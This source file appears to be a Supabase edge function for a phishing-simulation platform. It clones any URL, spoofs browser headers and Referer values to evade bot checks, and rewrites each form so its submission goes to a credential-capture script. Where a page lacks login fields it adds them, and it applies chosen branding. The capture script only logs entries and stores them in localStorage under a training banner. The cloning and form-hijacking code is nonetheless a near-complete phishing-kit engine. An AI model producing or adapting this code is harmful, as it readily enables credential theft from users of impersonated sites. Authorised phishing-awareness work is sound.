
// Follow this setup guide to integrate the Deno language server with your editor:
// https://deno.land/manual/getting_started/setup_your_environment
// This enables autocomplete, go to definition, etc.

import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
import { DOMParser } from "https://deno.land/x/deno_dom@v0.1.38/deno-dom-wasm.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? '',
      {
        global: {
          headers: { Authorization: req.headers.get('Authorization')! },
        },
      }
    );

    // Get the request body
    const requestData = await req.json();
    const { url, name, category, customizations, advancedCloning, template } = requestData;

    if (!url) {
      return new Response(
        JSON.stringify({ error: 'URL is required' }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        }
      );
    }

    console.log(`Attempting to clone website: ${url}`);
    console.log(`Advanced cloning mode: ${advancedCloning ? 'enabled' : 'disabled'}`);
    
    // Build enhanced browser-like headers
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': 'en-US,en;q=0.9',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-User': '?1',
      'Sec-Fetch-Dest': 'document',
      'Sec-Ch-Ua': '"Chromium";v="123", "Google Chrome";v="123", "Not:A-Brand";v="8"',
      'Sec-Ch-Ua-Mobile': '?0',
      'Sec-Ch-Ua-Platform': '"Windows"',
      'Upgrade-Insecure-Requests': '1',
    };
    
    // For some sites, add a referer which may help bypass security checks
    const parsedUrl = new URL(url);
    const targetDomain = parsedUrl.hostname;
    
    // Common domains to use a Referer header for
    const commonSites = [
      'google.com', 'microsoft.com', 'facebook.com', 'linkedin.com', 
      'amazon.com', 'apple.com', 'twitter.com', 'instagram.com', 
      'github.com', 'paypal.com', 'dropbox.com', 'netflix.com'
    ];
    
    // Check if target domain includes any of the common sites
    if (commonSites.some(site => targetDomain.includes(site))) {
      headers['Referer'] = `https://www.${targetDomain.split('.').slice(-2).join('.')}`;
    }

    // Use different fetching strategies to maximize success rate
    let response = null;
    let fetchError = null;
    
    // Strategy 1: Standard fetch with enhanced headers
    try {
      console.log(`Strategy 1: Standard fetch with enhanced headers`);
      response = await fetch(url, { headers });
      
      if (!response.ok) {
        console.log(`Strategy 1 failed with status: ${response.status}`);
        response = null;
      } else {
        console.log(`Strategy 1 succeeded with status: ${response.status}`);
      }
    } catch (error) {
      console.error(`Strategy 1 fetch error: ${error.message}`);
      fetchError = error;
    }
    
    // Strategy 2: Try with a different user agent if first attempt failed
    if (!response) {
      try {
        console.log(`Strategy 2: Using mobile user agent`);
        const mobileHeaders = {
          ...headers,
          'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
          'Sec-Ch-Ua-Mobile': '?1',
          'Sec-Ch-Ua-Platform': '"iOS"',
        };
        
        response = await fetch(url, { headers: mobileHeaders });
        
        if (!response.ok) {
          console.log(`Strategy 2 failed with status: ${response.status}`);
          response = null;
        } else {
          console.log(`Strategy 2 succeeded with status: ${response.status}`);
        }
      } catch (error) {
        console.error(`Strategy 2 fetch error: ${error.message}`);
        fetchError = error;
      }
    }
    
    // Strategy 3: Try with a proxy service if available (placeholder)
    // In a production environment, you might integrate with a proxy service
    
    // If all strategies failed
    if (!response) {
      const errorMessage = fetchError ? 
        `Failed to fetch website: ${fetchError.message}` : 
        "Failed to access the website. The site may be blocking automated access.";
      
      console.error(errorMessage);
      return new Response(
        JSON.stringify({ error: errorMessage }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 502,
        }
      );
    }

    // Get the content type and HTML content
    const contentType = response.headers.get('content-type') || '';
    if (!contentType.includes('text/html')) {
      console.error(`Unsupported content type: ${contentType}`);
      return new Response(
        JSON.stringify({ error: `Unsupported content type: ${contentType}. Only HTML pages can be cloned.` }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 415,
        }
      );
    }

    // Get the HTML content
    let htmlContent = await response.text();
    
    // Extract base URL for handling relative URLs
    const baseUrl = parsedUrl.origin;
    const urlPath = parsedUrl.pathname;
    const basePath = urlPath.substring(0, urlPath.lastIndexOf('/') + 1);
    
    // Parse the HTML to extract resources
    let cssContent = '';
    let jsContent = '';

    try {
      const document = new DOMParser().parseFromString(htmlContent, "text/html");
      if (!document) {
        throw new Error("Failed to parse HTML document");
      }
      
      // Get base tag if it exists
      let baseHref = baseUrl;
      const baseTag = document.querySelector("base[href]");
      if (baseTag && baseTag.getAttribute("href")) {
        try {
          baseHref = new URL(baseTag.getAttribute("href") || "", baseUrl).href;
        } catch (error) {
          console.error("Invalid base href:", error);
        }
      }
      
      // Process and update all <form> elements to capture credentials
      const forms = document.querySelectorAll("form");
      if (forms && forms.length > 0) {
        console.log(`Found ${forms.length} forms to modify for credential capture`);
        for (let i = 0; i < forms.length; i++) {
          const form = forms[i];
          form.setAttribute("onsubmit", "captureCredentials(event); return false;");
          
          // Add data-original-action to preserve the original form action
          const originalAction = form.getAttribute("action");
          if (originalAction) {
            form.setAttribute("data-original-action", originalAction);
          }
          
          // Ensure form method is POST
          if (!form.getAttribute("method")) {
            form.setAttribute("method", "post");
          }
          
          // Make sure all form fields have proper names for capturing
          const inputs = form.querySelectorAll("input");
          let hasUsername = false;
          let hasPassword = false;
          let hasEmail = false;
          
          for (let j = 0; j < inputs.length; j++) {
            const input = inputs[j];
            const type = input.getAttribute("type")?.toLowerCase();
            const name = input.getAttribute("name");
            const id = input.getAttribute("id")?.toLowerCase() || "";
            const placeholder = input.getAttribute("placeholder")?.toLowerCase() || "";
            const classes = input.getAttribute("class") || "";
            
            // For password fields
            if (type === "password") {
              hasPassword = true;
              if (!name) {
                input.setAttribute("name", "password");
              }
            } 
            // For email fields
            else if (type === "email" || id.includes("email") || placeholder.includes("email") || classes.includes("email")) {
              hasEmail = true;
              if (!name) {
                input.setAttribute("name", "email");
              }
            }
            // For username/text fields
            else if (type === "text" || !type) {
              if (!name && (id.includes("user") || placeholder.includes("user") || classes.includes("user"))) {
                input.setAttribute("name", "username");
                hasUsername = true;
              }
            }
          }
          
          // Add hidden fields for forms missing critical capture fields
          if (!hasPassword && forms.length === 1) {
            const passwordInput = document.createElement("input");
            passwordInput.setAttribute("type", "password");
            passwordInput.setAttribute("name", "password");
            passwordInput.setAttribute("placeholder", "Password");
            passwordInput.setAttribute("class", "phishing-field");
            form.appendChild(passwordInput);
          }
          
          if (!hasUsername && !hasEmail && forms.length === 1) {
            const usernameInput = document.createElement("input");
            usernameInput.setAttribute("type", "text");
            usernameInput.setAttribute("name", "username");
            usernameInput.setAttribute("placeholder", "Username or Email");
            usernameInput.setAttribute("class", "phishing-field");
            form.prepend(usernameInput);
          }
        }
      } else {
        console.log("No forms found in the HTML document, will add a generic login form");
        
        // Create a generic login form in a strategic position
        const loginForm = document.createElement("form");
        loginForm.setAttribute("id", "phishing-login-form");
        loginForm.setAttribute("class", "phishing-form");
        loginForm.setAttribute("onsubmit", "captureCredentials(event); return false;");
        loginForm.setAttribute("method", "post");
        
        // Create username field
        const usernameInput = document.createElement("input");
        usernameInput.setAttribute("type", "text");
        usernameInput.setAttribute("name", "username");
        usernameInput.setAttribute("placeholder", "Username or Email");
        usernameInput.setAttribute("required", "true");
        
        // Create password field
        const passwordInput = document.createElement("input");
        passwordInput.setAttribute("type", "password");
        passwordInput.setAttribute("name", "password");
        passwordInput.setAttribute("placeholder", "Password");
        passwordInput.setAttribute("required", "true");
        
        // Create submit button
        const submitButton = document.createElement("button");
        submitButton.setAttribute("type", "submit");
        submitButton.textContent = "Log In";
        
        // Add fields to form
        loginForm.appendChild(usernameInput);
        loginForm.appendChild(document.createElement("br"));
        loginForm.appendChild(passwordInput);
        loginForm.appendChild(document.createElement("br"));
        loginForm.appendChild(submitButton);
        
        // Add some basic styling
        const formStyle = document.createElement("style");
        formStyle.textContent = `
          .phishing-form {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.3);
            z-index: 9999;
            max-width: 300px;
            width: 100%;
          }
          .phishing-form input {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
          }
          .phishing-form button {
            width: 100%;
            padding: 10px;
            background: #0070f3;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
          }
        `;
        
        // Try to find a good spot to insert the form and style
        const body = document.querySelector("body");
        if (body) {
          body.appendChild(formStyle);
          body.appendChild(loginForm);
        }
      }
      
      // Add credential capture script to HTML
      const credentialScript = `
        <script>
          function captureCredentials(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);
            const data = {};
            formData.forEach((value, key) => {
              data[key] = value;
            });
            
            // Log captured credentials for security awareness demonstration
            console.log('Security awareness test - credentials captured:', data);
            
            // Store information in localStorage for reporting
            const interactionData = {
              timestamp: new Date().toISOString(),
              data: data,
              page: window.location.href,
              formAction: form.getAttribute('data-original-action') || form.getAttribute('action')
            };
            
            try {
              // Store interaction data locally
              let interactions = JSON.parse(localStorage.getItem('phishing_interactions') || '[]');
              interactions.push(interactionData);
              localStorage.setItem('phishing_interactions', JSON.stringify(interactions));
              
              // Post data to a webhook endpoint if configured
              // This would be enabled in a real phishing simulation
            } catch(e) {
              console.error('Error storing interaction data:', e);
            }
            
            // Show security awareness message
            const messageContainer = document.createElement('div');
            messageContainer.style.position = 'fixed';
            messageContainer.style.top = '0';
            messageContainer.style.left = '0';
            messageContainer.style.width = '100%';
            messageContainer.style.padding = '20px';
            messageContainer.style.backgroundColor = '#f44336';
            messageContainer.style.color = 'white';
            messageContainer.style.textAlign = 'center';
            messageContainer.style.fontWeight = 'bold';
            messageContainer.style.zIndex = '9999';
            messageContainer.style.boxShadow = '0 4px 8px rgba(0,0,0,0.2)';
            messageContainer.innerHTML = 'This was a security awareness test. In a real attack, your credentials could have been stolen.';
            document.body.appendChild(messageContainer);
            
            return false;
          }
          
          // Add listeners to all forms on page load
          document.addEventListener('DOMContentLoaded', function() {
            // Make all password fields visible
            const passwordFields = document.querySelectorAll('input[type="password"]');
            passwordFields.forEach(field => {
              field.style.display = 'inline-block';
              field.style.visibility = 'visible';
              field.style.opacity = '1';
            });
            
            // Add event listeners to all forms
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
              if (!form.getAttribute('onsubmit')) {
                form.setAttribute('onsubmit', 'captureCredentials(event); return false;');
              }
            });
            
            // Make sure all buttons are visible and clickable
            const buttons = document.querySelectorAll('button, input[type="submit"], input[type="button"]');
            buttons.forEach(button => {
              button.style.display = 'inline-block';
              button.style.visibility = 'visible';
              button.style.opacity = '1';
              button.style.pointerEvents = 'auto';
            });
          });
        </script>
      `;
      
      // Extract all external CSS
      const externalStyles = document.querySelectorAll("link[rel='stylesheet']");
      if (externalStyles && externalStyles.length > 0) {
        console.log(`Found ${externalStyles.length} external stylesheets to fetch`);
        for (let i = 0; i < Math.min(externalStyles.length, 5); i++) {
          const href = externalStyles[i].getAttribute("href");
          if (href) {
            try {
              // Convert relative URLs to absolute
              let cssUrl = href;
              if (href.startsWith('/')) {
                cssUrl = baseUrl + href;
              } else if (!href.startsWith('http')) {
                cssUrl = new URL(href, baseHref).href;
              }
              
              console.log(`Fetching CSS: ${cssUrl}`);
              const cssResponse = await fetch(cssUrl, {
                headers: {
                  'User-Agent': headers['User-Agent'],
                  'Referer': url,
                }
              }).catch(e => {
                console.error(`Error fetching CSS ${cssUrl}:`, e);
                return null;
              });
              
              if (cssResponse && cssResponse.ok) {
                const css = await cssResponse.text();
                cssContent += `/* From ${cssUrl} */\n${css}\n\n`;
                
                // Update the href to be inline in the cloned page
                externalStyles[i].setAttribute("href", "");
                externalStyles[i].setAttribute("data-original-href", href);
              } else {
                console.log(`Failed to fetch CSS: ${cssUrl}, status: ${cssResponse?.status}`);
              }
            } catch (error) {
              console.error("Error processing CSS:", error);
            }
          }
        }
      }

      // Extract all inline styles
      const styleElements = document.querySelectorAll("style");
      if (styleElements && styleElements.length > 0) {
        console.log(`Found ${styleElements.length} inline style elements`);
        for (let i = 0; i < styleElements.length; i++) {
          const styleContent = styleElements[i].textContent || "";
          cssContent += `/* Inline style ${i + 1} */\n${styleContent}\n\n`;
        }
      }

      // Extract essential external JavaScript (avoid loading too many scripts)
      const externalScripts = document.querySelectorAll("script[src]");
      const essentialScriptPatterns = [/jquery/i, /login/i, /auth/i, /validation/i, /form/i];
      
      if (externalScripts && externalScripts.length > 0) {
        console.log(`Found ${externalScripts.length} external scripts`);
        let scriptsFetched = 0;
        for (let i = 0; i < externalScripts.length && scriptsFetched < 3; i++) {
          const src = externalScripts[i].getAttribute("src");
          if (src) {
            // Only fetch scripts that match essential patterns to avoid loading too much JS
            const isEssential = essentialScriptPatterns.some(pattern => pattern.test(src));
            if (isEssential) {
              try {
                // Convert relative URLs to absolute
                let jsUrl = src;
                if (src.startsWith('/')) {
                  jsUrl = baseUrl + src;
                } else if (!src.startsWith('http')) {
                  jsUrl = new URL(src, baseHref).href;
                }
                
                console.log(`Fetching JS: ${jsUrl}`);
                const jsResponse = await fetch(jsUrl, {
                  headers: {
                    'User-Agent': headers['User-Agent'],
                    'Referer': url,
                  }
                }).catch(e => {
                  console.error(`Error fetching JS ${jsUrl}:`, e);
                  return null;
                });
                
                if (jsResponse && jsResponse.ok) {
                  const js = await jsResponse.text();
                  jsContent += `/* From ${jsUrl} */\n${js}\n\n`;
                  scriptsFetched++;
                } else {
                  console.log(`Failed to fetch JS: ${jsUrl}, status: ${jsResponse?.status}`);
                }
              } catch (error) {
                console.error("Error processing JS:", error);
              }
            } else {
              console.log(`Skipping non-essential script: ${src}`);
            }
          }
        }
      }

      // Extract essential inline scripts
      const scriptElements = document.querySelectorAll("script:not([src])");
      if (scriptElements && scriptElements.length > 0) {
        console.log(`Found ${scriptElements.length} inline script elements`);
        for (let i = 0; i < Math.min(scriptElements.length, 5); i++) {
          const scriptContent = scriptElements[i].textContent || "";
          if (scriptContent.trim()) {
            jsContent += `/* Inline script ${i + 1} */\n${scriptContent}\n\n`;
          }
        }
      }
      
      // Apply enterprise customizations if provided
      if (customizations && advancedCloning) {
        console.log("Applying enterprise customizations to cloned page");
        
        const { companyName, companyLogo, primaryColor, secondaryColor } = customizations;
        
        // Add a custom style block for customizations
        let customCSS = "\n/* Enterprise Customizations */\n";
        
        if (primaryColor) {
          customCSS += `
            :root {
              --custom-primary-color: ${primaryColor};
            }
            .btn-primary, button[type="submit"], input[type="submit"], .primary-button,
            .button-primary, .btn.btn-primary, .submit, #submit, button[name="login"], 
            button[name="submit"], button.login, button.submit {
              background-color: var(--custom-primary-color) !important;
              border-color: var(--custom-primary-color) !important;
            }
          `;
        }
        
        if (secondaryColor) {
          customCSS += `
            :root {
              --custom-secondary-color: ${secondaryColor};
            }
            .btn-secondary, .secondary-button, a.btn:not(.btn-primary),
            .button-secondary, .btn.btn-secondary {
              background-color: var(--custom-secondary-color) !important;
              border-color: var(--custom-secondary-color) !important;
            }
          `;
        }
        
        // Add the custom CSS to our content
        cssContent += customCSS;
        
        // Replace logos if provided
        if (companyLogo) {
          // Look for logo images
          const logoSelectors = [
            "img[src*='logo']",
            "img[alt*='logo']", 
            "img.logo",
            ".logo img",
            "a.navbar-brand img",
            "header img",
            ".header img",
            ".brand img",
            ".site-logo img"
          ];
          
          const logoQuery = logoSelectors.join(", ");
          const logos = document.querySelectorAll(logoQuery);
          
          if (logos && logos.length > 0) {
            console.log(`Found ${logos.length} potential logo images to replace`);
            for (let i = 0; i < logos.length; i++) {
              const originalSrc = logos[i].getAttribute("src") || "";
              logos[i].setAttribute("data-original-src", originalSrc);
              logos[i].setAttribute("src", companyLogo);
            }
          }
        }
        
        // Replace company name if provided
        if (companyName) {
          // Look for common company name locations in title
          const titleElement = document.querySelector("title");
          if (titleElement) {
            const originalTitle = titleElement.textContent || "";
            if (originalTitle.match(/sign\s*in|log\s*in|login/i)) {
              titleElement.textContent = originalTitle.replace(
                /((log|sign)\s*(in|on)(\s*to\s*(.+))?)/i, 
                `$1 - ${companyName}`
              );
            } else {
              titleElement.textContent = `${originalTitle} - ${companyName}`;
            }
          }
          
          // Add a custom script to replace text nodes containing common company names
          jsContent += `
            /* Company Name Replacement Script */
            document.addEventListener('DOMContentLoaded', function() {
              const companyName = "${companyName}";
              const companyNameRegex = /(Google|Microsoft|Facebook|LinkedIn|Twitter|Amazon|Apple|GitHub|PayPal|Dropbox)/gi;
              
              function replaceTextInNode(node) {
                if (node.nodeType === 3) { // Text node
                  const text = node.nodeValue;
                  const newText = text.replace(companyNameRegex, companyName);
                  if (text !== newText) {
                    node.nodeValue = newText;
                  }
                } else if (node.nodeType === 1) { // Element node
                  const children = node.childNodes;
                  for (let i = 0; i < children.length; i++) {
                    replaceTextInNode(children[i]);
                  }
                }
              }
              
              replaceTextInNode(document.body);
              
              // Also check for copyright notices
              const copyrightElements = document.querySelectorAll(".copyright, footer, .footer");
              copyrightElements.forEach(element => {
                const text = element.innerHTML;
                if (text.includes("©") || text.includes("&copy;")) {
                  element.innerHTML = text.replace(
                    /(&copy;|©)\s*\d{4}(\s*-\s*\d{4})?\s*([A-Za-z0-9\s,.]+)/g,
                    "&copy; " + new Date().getFullYear() + " " + companyName
                  );
                }
              });
            });
          `;
        }
      }
      
      // Inject credential capture script
      jsContent += credentialScript;
      
      // Update HTML with the serialized document
      htmlContent = document.documentElement.outerHTML;
    } catch (error) {
      console.error("Error using DOM parser:", error);
      console.log("Falling back to manual HTML processing");
      // Continue with backup method
    }

    // Backup: Process HTML with regex if DOM parsing failed
    if (!cssContent && !jsContent) {
      console.log("Using backup regex method for HTML processing");
      
      // Backup: Extract inline styles
      const styleMatches = htmlContent.match(/<style[^>]*>([\s\S]*?)<\/style>/gi);
      if (styleMatches) {
        cssContent = styleMatches.map(match => {
          const content = match.replace(/<style[^>]*>|<\/style>/gi, '');
          return content;
        }).join('\n');
      }

      // Backup: Extract inline scripts
      const scriptMatches = htmlContent.match(/<script[^>]*>([\s\S]*?)<\/script>/gi);
      if (scriptMatches) {
        jsContent = scriptMatches.map(match => {
          if (!match.includes('src=')) {
            const content = match.replace(/<script[^>]*>|<\/script>/gi, '');
            return content;
          }
          return '';
        }).filter(Boolean).join('\n');
      }
      
      // Add form capture for backup method
      const formCapture = `
      <script>
        document.addEventListener('DOMContentLoaded', function() {
          const forms = document.querySelectorAll('form');
          forms.forEach(form => {
            form.addEventListener('submit', function(e) {
              e.preventDefault();
              const formData = new FormData(form);
              const data = {};
              formData.forEach((value, key) => {
                data[key] = value;
              });
              console.log('Security awareness test - credentials captured:', data);
              
              // Create a visual alert
              const messageContainer = document.createElement('div');
              messageContainer.style.position = 'fixed';
              messageContainer.style.top = '0';
              messageContainer.style.left = '0';
              messageContainer.style.width = '100%';
              messageContainer.style.padding = '20px';
              messageContainer.style.backgroundColor = '#f44336';
              messageContainer.style.color = 'white';
              messageContainer.style.textAlign = 'center';
              messageContainer.style.fontWeight = 'bold';
              messageContainer.style.zIndex = '9999';
              messageContainer.style.boxShadow = '0 4px 8px rgba(0,0,0,0.2)';
              messageContainer.innerHTML = 'This was a security awareness test. In a real attack, your credentials could have been stolen.';
              document.body.appendChild(messageContainer);
              
              return false;
            });
          });
        });
      </script>`;
      
      // Add credential capture script for backup method
      jsContent += formCapture;
    }

    // Process the HTML to handle relative URLs
    let processedHtml = htmlContent;
    try {
      // Convert relative URLs in href and src attributes to absolute
      processedHtml = processedHtml.replace(/\s(href|src)=["'](?!http|https|\/\/|#|javascript|data:)([^"']+)["']/gi, (match, attr, path) => {
        try {
          let absoluteUrl;
          if (path.startsWith('/')) {
            absoluteUrl = baseUrl + path;
          } else {
            absoluteUrl = baseUrl + (basePath + path).replace(/\/\.\//, '/').replace(/\/[^\/]+\/\.\.\//, '/');
          }
          return ` ${attr}="${absoluteUrl}"`;
        } catch (e) {
          console.error("Error converting URL:", e);
          return match; // Keep original if conversion fails
        }
      });
      
      // Add base tag if it doesn't exist
      if (!processedHtml.includes('<base ')) {
        processedHtml = processedHtml.replace(/<head[^>]*>/i, `$&\n<base href="${baseUrl}/">`);
      }
      
      // Inject our CSS override to ensure form inputs are visible
      const cssOverride = `
      <style id="phishing-override">
        /* Global visibility overrides */
        input, select, textarea, button {
          display: inline-block !important;
          visibility: visible !important;
          opacity: 1 !important;
          pointer-events: auto !important;
        }
        /* Login form visibility */
        form, .form, .login-form, #login-form {
          display: block !important;
          visibility: visible !important;
          opacity: 1 !important;
          pointer-events: auto !important;
        }
        /* Password field visibility */
        input[type="password"] {
          display: inline-block !important;
          visibility: visible !important;
          opacity: 1 !important;
        }
        /* Z-index fix for login forms */
        form, .form, .login-form, #login-form, .phishing-form {
          z-index: 9999 !important;
        }
        /* Security banner styles */
        .security-test-banner {
          position: fixed;
          bottom: 0;
          left: 0;
          width: 100%;
          background-color: rgba(0,0,0,0.7);
          color: white;
          text-align: center;
          padding: 8px;
          font-size: 12px;
          z-index: 999999;
        }
      </style>
      `;
      
      processedHtml = processedHtml.replace(/<\/head>/i, `${cssOverride}\n</head>`);
      
      // Add security banner
      const securityBanner = `
      <div class="security-test-banner">
        This is a security awareness training page - No real credentials are being collected
      </div>
      `;
      
      processedHtml = processedHtml.replace(/<\/body>/i, `${securityBanner}\n</body>`);
      
    } catch (error) {
      console.error("Error processing HTML URLs:", error);
    }

    // Save to database
    const pageName = name || new URL(url).hostname;
    
    console.log(`Saving cloned page: ${pageName} from ${url}`);
    
    const { data: pageData, error: pageError } = await supabaseClient
      .from('phishing_pages')
      .insert([
        {
          name: pageName,
          category: category || 'Cloned',
          source_url: url,
          html_content: processedHtml,
          css_content: cssContent,
          js_content: jsContent,
          is_custom: false,
        },
      ])
      .select()
      .single();

    if (pageError) {
      console.error('Error saving page:', pageError);
      return new Response(
        JSON.stringify({ error: pageError.message }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        }
      );
    }

    console.log('Successfully cloned and saved page with ID:', pageData.id);
    
    return new Response(
      JSON.stringify({ success: true, data: pageData }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      }
    );
  } catch (error) {
    console.error('Unexpected error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    
    return new Response(
      JSON.stringify({ error: errorMessage }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      }
    );
  }
})
